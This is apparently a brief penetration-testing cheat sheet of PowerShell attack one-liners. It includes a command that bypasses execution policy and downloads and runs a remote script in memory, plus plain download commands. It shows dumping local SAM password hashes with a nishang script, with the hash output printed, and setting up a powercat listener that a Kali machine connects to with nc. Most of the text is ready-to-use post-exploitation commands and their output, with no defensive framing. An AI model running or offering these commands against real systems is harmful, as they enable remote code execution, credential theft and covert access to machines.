
# Powershell Kungfu

## Powershell Download

There is nothing on disk in this option

	powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://server/file.ps1')|iex"

PowerShell  one liner download (any version)

	(New-Object System.Net.WebClient).DownloadFile("http://server/file.ps1", "file.ps1")  

PowerShell  one liner download (4.0 & 5.0)

	Invoke-WebRequest "http://server/file.ps1" -OutFile "file.ps1"  


## Read Local Sam Hashes

Download script from here : https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1

import and run script

	PS C:\Users\testuser\Desktop\share> . .\Get-PassHashes.ps1
	PS C:\Users\testuser\Desktop\share> Get-PassHashes
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	win10:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	

## Powercat

Download script from here : https://github.com/besimorhino/powercat/blob/master/powercat.ps1

import and start listener

	PS C:\Users\testuser\Desktop\share> . .\powercat.ps1
	PS C:\Users\testuser\Desktop\share> powercat -l -p 4444
	i connected from kali
	
connect from another device

	┌──(kali㉿kali)-[~/Desktop]
	└─$ nc 192.168.200.112 4444                                    
	i connected from kali